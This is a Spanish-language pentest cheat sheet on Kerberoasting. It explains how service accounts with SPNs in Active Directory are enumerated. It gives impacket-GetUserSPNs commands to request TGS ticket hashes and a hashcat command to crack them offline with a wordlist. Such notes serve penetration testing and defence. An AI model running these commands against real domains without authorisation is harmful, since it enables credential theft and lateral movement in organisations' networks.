# Kerberoasting 

Tags: #AD #Kerberoasting #Impacket #Kali #Parrot #HashCat 

"Impacket-GetUserSPNs" es una herramienta de la suite Impacket, diseñada para interactuar con protocolos de red, específicamente en entornos Microsoft. Es ampliamente utilizada en pruebas de penetración y Red Teaming para identificar cuentas de servicio con nombres principales de servicio (SPNs) registrados en Active Directory (AD). Esto permite a los evaluadores descubrir posibles objetivos para ataques como Kerberoasting.

```bash 
- Los SPNs se utilizan en Active Directory para asociar un servicio específico con una cuenta de usuario o de computadora que ejecuta ese servicio. Esto es crucial para el proceso de autenticación Kerberos.
    
- Un SPN incorrectamente configurado o asociado con una cuenta de usuario en lugar de una cuenta de servicio puede ser explotado para comprometer la seguridad de la red.


GetUserSPNs en Impacket: La funcionalidad GetUserSPNs se utiliza específicamente para identificar y explotar configuraciones inseguras de SPNs dentro de un dominio de Active Directory. Aquí está cómo funciona:

1. Enumeración de SPNs: Primero, el atacante o pentester utiliza GetUserSPNs para enumerar todos los SPNs configurados en el dominio que están asociados con cuentas de usuario regulares en lugar de cuentas de servicio. Esto se hace enviando consultas al controlador de dominio y solicitando información específica sobre los SPNs.
    
2. Extracción de Tickets TGS: Una vez que se identifican las cuentas de usuario con SPNs, GetUserSPNs puede solicitar tickets de servicio Kerberos (conocidos como Ticket Granting Service o TGS) para esos servicios desde el controlador de dominio, utilizando la funcionalidad de Kerberos conocida como Kerberoasting.
    
3. Crackeo de Tickets: Los TGS obtenidos están cifrados con la contraseña de la cuenta de usuario asociada con el SPN. Sin embargo, debido a que muchas organizaciones utilizan políticas de contraseñas débiles, un atacante puede intentar "romper" el cifrado de estos tickets fuera de línea mediante fuerza bruta o técnicas de adivinación de contraseñas.
    
4. Compromiso de Cuentas: Si el atacante logra descifrar la contraseña de una cuenta, puede utilizar esas credenciales para acceder a sistemas, elevar privilegios, o realizar movimientos laterales dentro de la red, comprometiendo potencialmente la seguridad de toda la organización.
```

## Obtener Hash con Impacket-GetUsersSPNs

```bash 
❯ impacket-GetUserSPNs domain.corp/user:Password     # Mirar si el usuario es Kerberosteable y listar los usuarios a los que se le puede solicitar un TGS

❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request  # Solicitar un TGS 
❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request -outputfile kerb.txt  # Solicitar varios TGS
	
	# dc-ip = Dirección IP del DC
	# domain1 = Dominio 
	# user = Usuario valido del dominio 
	# Password = Contraseña del usuario valido 

Notas:
	1. Tener la IP con el dominio en '/etc/hosts'
	2. Cuando hay varios TGS para un usuario es mejor crear un archivo para extraer los hashes. De lo contrario no saldrán los hashes por consola 
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 13100 hash-kerberoasting /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 13100 = TGS de un Kerberoasting
	# hash-kerberoasting = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```